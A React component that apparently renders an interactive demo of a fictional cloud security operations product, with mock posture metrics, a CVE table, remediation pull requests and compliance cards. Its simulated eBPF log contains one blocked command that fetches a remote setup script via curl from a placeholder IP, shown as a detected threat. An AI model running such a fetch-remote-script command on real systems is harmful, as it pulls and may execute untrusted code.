'use client';

import * as React from 'react';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Terminal, 
  Cpu, 
  AlertTriangle, 
  CheckCircle2, 
  Lock, 
  Activity, 
  ChevronRight, 
  GitPullRequest, 
  Search,
  Radio
} from 'lucide-react';
import { trackEvent } from '@/lib/analytics';

const screens = [
  { id: 'sentinel-radar', title: '01. Threat Posture Radar', type: 'SOC Overview' },
  { id: 'sentinel-cve', title: '02. CVE Exploitability Matrix', type: 'Vulnerability Radar' },
  { id: 'sentinel-runtime', title: '03. Runtime eBPF Defense', type: 'K8s Cluster Guard' },
  { id: 'sentinel-remediation', title: '04. Remediation PR Engine', type: 'Infrastructure as Code' },
  { id: 'sentinel-compliance', title: '05. SOC 2 Audit Telemetry', type: 'Compliance Drift' },
];

export function SentinelShowcase() {
  const [activeScreen, setActiveScreen] = React.useState<string>('sentinel-radar');
  const [selectedIncident, setSelectedIncident] = React.useState<string>('INC-849');

  const handleScreenChange = (screenId: string) => {
    setActiveScreen(screenId);
    trackEvent('lab_screen_engaged', { slug: 'sentinel', screenId });
  };

  return (
    <div className="rounded-3xl border border-cyan-500/30 bg-surface-100/90 dark:bg-surface-900/90 shadow-2xl overflow-hidden backdrop-blur-md">
      {/* Product Top Header */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between px-6 py-4 border-b border-border/60 bg-surface-200/50 dark:bg-surface-950/50 gap-4">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded-xl bg-cyan-500/20 text-cyan-400 flex items-center justify-center font-bold">
            <ShieldAlert className="w-4 h-4" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="font-semibold text-sm text-foreground">Sentinel Cloud SOC</span>
              <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
                Interactive Showcase
              </span>
            </div>
            <span className="text-xs text-muted-foreground font-mono">DevSecOps Posture &amp; eBPF Autonomous Defense</span>
          </div>
        </div>

        {/* Screen Tabs */}
        <div className="flex flex-wrap gap-1.5 p-1 rounded-xl bg-surface-100 dark:bg-surface-900 border border-border/60">
          {screens.map((s) => (
            <button
              key={s.id}
              type="button"
              onClick={() => handleScreenChange(s.id)}
              className={`px-3 py-1.5 rounded-lg text-xs font-mono transition-all ${
                activeScreen === s.id
                  ? 'bg-cyan-600 text-white font-bold shadow-xs'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              {s.title}
            </button>
          ))}
        </div>
      </div>

      {/* Screen Body */}
      <div className="p-6 sm:p-8 min-h-[520px]">
        {/* SCREEN 1: Threat Posture Radar */}
        {activeScreen === 'sentinel-radar' && (
          <div className="space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-border/50">
              <div>
                <h4 className="text-base font-semibold text-foreground">Cloud Security Posture (CSPM) &middot; Multi-Region</h4>
                <p className="text-xs text-muted-foreground font-mono">42 AWS &amp; GCP Accounts &middot; 1,480 K8s Pods Monitored</p>
              </div>
              <span className="text-xs font-mono text-emerald-400 flex items-center gap-1">
                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                Zero Critical Breaches Detected
              </span>
            </div>

            {/* Quick Metrics */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
              <div className="p-4 rounded-xl bg-background/80 border border-border/60 space-y-1">
                <span className="text-[11px] font-mono text-muted-foreground uppercase">Posture Health Score</span>
                <div className="text-2xl font-bold font-mono text-foreground">94.8 / 100</div>
                <span className="text-[11px] text-emerald-400 font-mono">+3.2 pts vs last audit</span>
              </div>
              <div className="p-4 rounded-xl bg-background/80 border border-border/60 space-y-1">
                <span className="text-[11px] font-mono text-muted-foreground uppercase">Mean Time to Remediate</span>
                <div className="text-2xl font-bold font-mono text-foreground">18 mins</div>
                <span className="text-[11px] text-cyan-400 font-mono">Automated IaC PRs</span>
              </div>
              <div className="p-4 rounded-xl bg-background/80 border border-border/60 space-y-1">
                <span className="text-[11px] font-mono text-muted-foreground uppercase">EPSS Exploitable CVEs</span>
                <div className="text-2xl font-bold font-mono text-foreground">2 Active</div>
                <span className="text-[11px] text-amber-400 font-mono">Both isolated in VPC sandbox</span>
              </div>
              <div className="p-4 rounded-xl bg-background/80 border border-border/60 space-y-1">
                <span className="text-[11px] font-mono text-muted-foreground uppercase">SOC 2 Controls Passing</span>
                <div className="text-2xl font-bold font-mono text-foreground">100%</div>
                <span className="text-[11px] text-emerald-400 font-mono">Continuous compliance active</span>
              </div>
            </div>

            {/* Active Security Alerts */}
            <div className="p-5 rounded-2xl bg-background/80 border border-border/60 space-y-3">
              <span className="text-xs font-mono text-muted-foreground uppercase">Live Security Signals &amp; Triage</span>
              <div className="space-y-2 text-xs font-mono">
                {[
                  { id: 'SEC-4091', sev: 'HIGH', title: 'Unexpected outbound connection to unknown IP (Port 4444)', pod: 'prod-api-worker-7d', action: 'eBPF Filter Throttled' },
                  { id: 'SEC-4090', sev: 'MEDIUM', title: 'AWS S3 bucket missing default KMS bucket key encryption', pod: 'analytics-raw-events', action: 'Terraform PR Auto-generated' },
                  { id: 'SEC-4089', sev: 'LOW', title: 'Stale IAM role without activity in past 90 days', pod: 'legacy-ci-deployer', action: 'Access Revocation Queued' },
                ].map((sig, i) => (
                  <div key={i} className="p-3 rounded-xl bg-surface-200/40 dark:bg-surface-800/30 border border-border/40 flex flex-col md:flex-row md:items-center justify-between gap-2">
                    <div className="flex items-center gap-3">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                        sig.sev === 'HIGH' ? 'bg-rose-500/10 text-rose-400 border border-rose-500/20' :
                        sig.sev === 'MEDIUM' ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20' :
                        'bg-blue-500/10 text-blue-400 border border-blue-500/20'
                      }`}>
                        {sig.sev}
                      </span>
                      <div>
                        <strong className="text-foreground text-xs font-sans block">{sig.title}</strong>
                        <span className="text-muted-foreground text-[11px]">{sig.id} &middot; Target: {sig.pod}</span>
                      </div>
                    </div>
                    <span className="text-cyan-400 text-xs font-semibold">{sig.action}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* SCREEN 2: CVE Exploitability Matrix */}
        {activeScreen === 'sentinel-cve' && (
          <div className="space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-border/50">
              <div>
                <h4 className="text-base font-semibold text-foreground">CVE Exploitability Prediction Scoring System (EPSS)</h4>
                <p className="text-xs text-muted-foreground font-mono">Focusing engineering effort strictly on weaponized, reachable vulnerabilities</p>
              </div>
              <span className="text-xs font-mono text-cyan-400 bg-cyan-500/10 border border-cyan-500/20 px-3 py-1 rounded-xl">
                Noise Reduction: 88% CVEs filtered as unreachable
              </span>
            </div>

            <div className="p-4 rounded-2xl bg-background/80 border border-border/60 space-y-3">
              <div className="space-y-3 text-xs font-mono">
                {[
                  { cve: 'CVE-2024-38063', pkg: 'tcpip.sys kernel stack overflow', cvss: '9.8 CRITICAL', epss: '84.2%', reachable: 'YES (Exposed)', fix: 'Patch KB5041578 available' },
                  { cve: 'CVE-2024-21626', pkg: 'runc container escape (leaky file descriptors)', cvss: '8.6 HIGH', epss: '61.4%', reachable: 'CONTAINED', fix: 'Upgrade containerd to v1.7.13' },
                  { cve: 'CVE-2024-6387', pkg: 'OpenSSH regreSSHion signal handler race', cvss: '8.1 HIGH', epss: '12.0%', reachable: 'NO (Behind VPN)', fix: 'Backported in Ubuntu 22.04 LTS' },
                ].map((cve, i) => (
                  <div key={i} className="p-3.5 rounded-xl bg-surface-200/40 dark:bg-surface-800/30 border border-border/40 flex flex-col md:flex-row md:items-center justify-between gap-3">
                    <div>
                      <div className="flex items-center gap-2">
                        <span className="text-cyan-400 font-bold">{cve.cve}</span>
                        <strong className="text-foreground text-sm font-sans">{cve.pkg}</strong>
                      </div>
                      <span className="text-muted-foreground text-[11px]">Recommended Action: {cve.fix}</span>
                    </div>

                    <div className="flex items-center gap-4 text-right">
                      <div>
                        <span className="text-foreground font-bold">{cve.cvss}</span>
                        <span className="text-[10px] text-amber-400 block font-mono">EPSS Probability: {cve.epss}</span>
                      </div>
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                        cve.reachable === 'YES (Exposed)' ? 'bg-rose-500/10 text-rose-400 border border-rose-500/20' : 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20'
                      }`}>
                        {cve.reachable}
                      </span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* SCREEN 3: Runtime eBPF Defense */}
        {activeScreen === 'sentinel-runtime' && (
          <div className="space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-border/50">
              <div>
                <h4 className="text-base font-semibold text-foreground">eBPF Kernel Telemetry &amp; Runtime Container Isolation</h4>
                <p className="text-xs text-muted-foreground font-mono">Zero-overhead kernel probes intercepting syscalls (sys_enter_execve, socket_connect)</p>
              </div>
              <span className="text-xs font-mono text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-3 py-1 rounded-xl">
                eBPF Filter Latency: &lt; 4 microseconds
              </span>
            </div>

            <div className="p-5 rounded-2xl bg-surface-950 text-cyan-400 font-mono text-xs border border-cyan-500/30 space-y-3">
              <div className="flex items-center justify-between border-b border-cyan-500/20 pb-2 text-muted-foreground">
                <span className="flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-cyan-400" />
                  Live Kernel Syscall Intercept Stream
                </span>
                <span className="text-[10px]">Filter: drop-anomalous-exec</span>
              </div>

              <div className="space-y-1 text-[11px] leading-relaxed">
                <div>[08:42:19.004] <span className="text-emerald-400">ALLOW</span> syscall=sys_enter_execve comm=&quot;node&quot; pid=2401 container=&quot;prod-gateway-8f&quot;</div>
                <div>[08:42:19.244] <span className="text-emerald-400">ALLOW</span> syscall=sys_connect comm=&quot;redis-client&quot; dest=10.0.4.12:6379</div>
                <div className="text-rose-400 font-bold bg-rose-500/10 p-1 rounded border border-rose-500/30">
                  [08:42:20.118] BLOCK syscall=sys_enter_execve comm=&quot;curl&quot; args=&quot;-s http://198.51.100.2/setup.sh&quot; container=&quot;auth-worker-2&quot; [MITRE ATT&amp;CK T1059.004 Detected]
                </div>
                <div>[08:42:20.120] <span className="text-cyan-300">AUTO-ISOLATE</span> Pod &quot;auth-worker-2&quot; quarantined from ingress mesh &amp; memory core dumped for forensic audit.</div>
              </div>
            </div>
          </div>
        )}

        {/* SCREEN 4: Remediation PR Engine */}
        {activeScreen === 'sentinel-remediation' && (
          <div className="space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-border/50">
              <div>
                <h4 className="text-base font-semibold text-foreground">Infrastructure as Code (IaC) Remediation PR Engine</h4>
                <p className="text-xs text-muted-foreground font-mono">Automated GitHub pull requests generated directly against Terraform &amp; Helm charts</p>
              </div>
              <span className="text-xs font-mono text-cyan-400 bg-cyan-500/10 border border-cyan-500/20 px-3 py-1 rounded-xl">
                4 Open Pull Requests
              </span>
            </div>

            <div className="space-y-3">
              {[
                { pr: '#PR-418', repo: 'vance-cloud/terraform-aws-eks', title: 'fix: enable IMDSv2 token required on worker nodes to prevent SSRF credential theft', author: 'Sentinel Bot', status: 'CI PASSED' },
                { pr: '#PR-417', repo: 'vance-cloud/k8s-helm-charts', title: 'security: drop CAP_SYS_ADMIN and enforce readOnlyRootFilesystem on ingress proxy', author: 'Sentinel Bot', status: 'REVIEW_REQUESTED' },
              ].map((p, i) => (
                <div key={i} className="p-4 rounded-xl bg-background/80 border border-border/60 flex flex-col md:flex-row md:items-center justify-between gap-3">
                  <div>
                    <div className="flex items-center gap-2">
                      <GitPullRequest className="w-4 h-4 text-cyan-400" />
                      <span className="text-xs font-mono text-cyan-400 font-bold">{p.pr}</span>
                      <strong className="text-sm font-semibold text-foreground">{p.title}</strong>
                    </div>
                    <span className="text-xs text-muted-foreground font-mono mt-1 block">Repo: {p.repo} &middot; Author: {p.author}</span>
                  </div>
                  <span className="text-[11px] font-mono px-2.5 py-1 rounded-xl bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-bold self-start md:self-auto">
                    {p.status}
                  </span>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* SCREEN 5: SOC 2 Audit Telemetry */}
        {activeScreen === 'sentinel-compliance' && (
          <div className="space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-border/50">
              <div>
                <h4 className="text-base font-semibold text-foreground">Continuous SOC 2 Type II &amp; ISO 27001 Evidence Auditor</h4>
                <p className="text-xs text-muted-foreground font-mono">Automated daily snapshot of cloud infrastructure controls for auditor review</p>
              </div>
              <span className="text-xs font-mono text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-3 py-1 rounded-xl">
                100% Audit Readiness
              </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs font-mono">
              <div className="p-4 rounded-xl bg-background/80 border border-border/60 space-y-2">
                <span className="text-muted-foreground uppercase block text-[10px]">Access Control (CC6.1)</span>
                <span className="text-emerald-400 font-bold block text-sm">100% MFA Enforced</span>
                <p className="text-muted-foreground text-[11px]">All 48 engineer accounts verified via FIDO2 WebAuthn.</p>
              </div>
              <div className="p-4 rounded-xl bg-background/80 border border-border/60 space-y-2">
                <span className="text-muted-foreground uppercase block text-[10px]">Encryption at Rest (CC6.6)</span>
                <span className="text-emerald-400 font-bold block text-sm">AES-256 Validated</span>
                <p className="text-muted-foreground text-[11px]">All RDS instances &amp; EBS volumes cryptographic proofs verified.</p>
              </div>
              <div className="p-4 rounded-xl bg-background/80 border border-border/60 space-y-2">
                <span className="text-muted-foreground uppercase block text-[10px]">Incident Response (CC7.3)</span>
                <span className="text-emerald-400 font-bold block text-sm">&lt; 15m MTTR Drill</span>
                <p className="text-muted-foreground text-[11px]">Quarterly simulated ransomware drill passed with zero data loss.</p>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
